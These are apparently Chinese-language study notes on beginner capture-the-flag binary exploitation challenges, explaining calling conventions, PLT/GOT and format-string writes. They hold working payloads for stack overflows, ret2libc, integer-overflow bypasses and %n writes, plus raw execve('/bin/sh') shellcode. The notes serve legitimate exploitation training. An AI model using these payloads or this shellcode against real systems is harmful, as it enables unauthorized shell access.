顺序：

get_shell
连上就可以得到shell，payload=‘’
简单介绍做pwn题的两种方法及peda安装方法

hello_pwn
两个buffer间的偏移溢出。输入与判断间相差4个字节payload = 'A' * 4 + p64(1853186401)
read(0,&unk_601068,0x10ull)
if(dword_60106C == 1853186401) sub_400686(0LL,&unk_601068)
大小端序，简单介绍做法和exp

level0
最简单的缓冲区溢出，read函数中栈的长度小于第三个参数payload='a'*0x88+p64(0x400596)
return read(0,&buf,0x200uLL)
int callsystem() {return system("/bin/sh")}
Linux下文件改名:mv
64位程序逆序中寄存器占8位，64位传参顺序rdi,rsi,rdx,rcx,r8,r9(适用于Linux系统)
		      64位传参顺序rcx,rdx,r8,r9(适用于Windows系统)，除前四个参数之外的任何其他参数通过栈传递，从右至左入栈
system("/bin/sh")可以提供一个shell，使用它可以进行查看/修改/操作等动作
IDA中栈s与r的含义，ebp和eip
ELF直接获取函数地址：elf.symbols['callsystem']
exp最详细注释
ROPgadget的用法：获取字符串地址与返回值地址，objdump得到plt表的地址

level2
level0升级版，没有直接给出system("/bin/sh")函数，而是给出了system函数地址与/bin/sh字符串地址payload='a'*0x8C+p32(0x8048320)+'a'*4+p32(0x804A024)
return read(0,&buf,0x100u);
system填写的是plt表的地址，此外注意栈的结构：调用函数地址->函数的返回地址->参数n->参数n-1->···->参数1
题解
system函数地址可以是plt表中的也可以是.got.plt表中的
x32四种调用约定的参数各自放在不同的地方，x64会放在rdi,rsi,rdx,rcx,r8,r9六个寄存器里（Linux环境中），windows下参数放在rcx,rdx,r8,r9寄存器中
调用函数时栈的结构为：调用函数地址->函数的返回地址->参数n->参数n-1->···->参数1

when_did_you_born
两个buffer间的偏移溢出，结果等于1926自动执行system("cat flag")语句，与hello_pwn题相同，不同点是脆弱点函数payload = 'a'*8+p64(1926)//v6在栈中是dd，因此用p64
gets(&v5)
if(v6==1926)
题解
checksec
file
./运行查看功能
写exp时字符前面加b，可转成bytes，避免报错。例如b'a'*(0x20-0x18)

guess_num
通过溢出，覆盖seed，生成我们自己的种子密钥，再用c编程实现该过程payload='a'*0x20+p64(1)	num=["2","5","4","2","6","2","5","1","4","2"] 	for i in range(10)://seed在栈中是dd类型
gets(&v11)
srand(seed[0])
题解
两种系统下生成的伪随机数不一样
官方解法：libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')	lib.srand(1)


int_overflow
输入1进入login函数，没问题，进入check_passwd函数，发现脆弱点函数strcpy(&dest, s);把s的值复制到dest，如果s的值够长，就能造出栈溢出。此外对于范围检查，使用整形溢出绕过payload = "a"*0x14+"a"*4+p32(0x804868b)+"a"*(256-0x18-4)+"a"*4
read(0, &buf, 0x199u);//sizeof(buf)>0x199，不存在溢出
if ( v3 <= 3u || v3 > 8u ){}//unsigned __int8 v3，如果v3=256，则溢出为1
else	result = strcpy(&dest, s);
题解
read函数不能当脆弱点原因
本题中payload构成


cgpwn2
危险函数gets(&s)可以溢出，name为全局变量，地址不变，利用该空间存放/bin/sh。system函数地址由plt表给出payload = "a"*0x26+"a"*0x4+p32(system)+"a"*4+p32(name)
fgets(name, 50, stdin);
return gets(&s);
题目流程
name位于bss区，可将字符串写入name变量

level3
危险函数read(0，&buf，0x100u)，栈长度大于0x100,溢出但没有system函数地址与/bin/sh字符串地址。需要got表查找。通过栈溢出，利用 write 函数将其本身在GOT表中的地址泄露出来，减去在 libc_32.so 中的偏移，得到基址，紧接着重新进入 main 函数，再次通过栈溢出，利用 system 函数完成get shell
payload = 'A'*0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0xdeadbeef)
payload0 = 'A'*0x88 + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
read(0，&buf，0x100u)
write函数为0，1，2时的特殊用途（标准输入，标准输入，错误输出），系统定制，无须open
PLT（内部表），GOT（全局表），PLT表存放GOT表的地址，PLT表通过GOT表得到函数真实地址
本题思路：libc中的函数的相对地址是固定的，要想获取到system函数的地址，可以通过write()函数进行offset计算。
.plt与.got表描述：got表动态表，相当于实际偏移的指针。
plt表要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址，并填充到.got.plt节中，并跳转，其是由代码片段组成的，每个代码片段都跳转到GOT表中的一个具体的函数调用（每个程序中该表都不会变化，因此是静态表，指针的指针）
.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。相当于.plt的GOT全局偏移表，内容有两种情况：1）如果之前查找到该符号，内容为外部函数的具体地址，2）如果没查找过，内容为跳转会.plt的地址。（快速查找表）


CGfsb
if ( pwnme == 8 ){system("cat flag");}。在 printf 中，使用 *<a_number_of_chars>%<number>$n* 就可以将相应的第 *<number>* 个参数的位置写为 % 前输出的字符数量。而pwnme是.bss段的全局变量，地址不变。payload=p32(pwnme_addr)+'aaaa'+'%10$n'
printf((const char *)&v8);
题解
%n的用法
payload写法


string
进入main函数中，发现main函数调用sub_400D72()函数，进入该函数，发现该函数调用sub_400A7D()，sub_400BB9()和sub_400CA6()三个函数，第一个函数为输入east跳出循环。第二个函数中指令printf(&format,&format)存在格式化字符串漏洞，可以进行任意地址写。值得注意的是在他的上面有两个输入点，一个是“%ld”格式，一个是“%s”格式。第三个函数存在指令为((void(*fastcall *)(_QWORD,void *)v1)(0LL,v1)是将v1强制转化为函数指针类型，然后调用该函数。最后一个函数中的强制转换指令类型为脆弱点，该语句将V1一个void指针强制类型转换成函数指针并调用了，所以我们将shellcode通过上面的read写入就会得到shell。而执行该条指令的条件为*(DWORD *)a1 == *(DWORD*)(a1+4)，即a1[0]==a1[1]。回溯该变量，发现该变量为主函数中的v5，而v5=(__int64)v4。*v4=68,v4[1]=85，我们要做的就是将*v4=v4[1]，这里就需要利用第二个函数中的格式化字符串漏洞，从而将v4[0]的值改为85.
conn.sendlineafter('And, you wish is:', '%85c%7$n')	shellcode = '\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'
printf(&format, &format);
((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);
在 printf 中，使用 *<a_number_of_chars>%<number>$n* 就可以将相应的第 *<number>* 个参数的位置写为 % 前输出的字符数量
x64的调用约定
题解






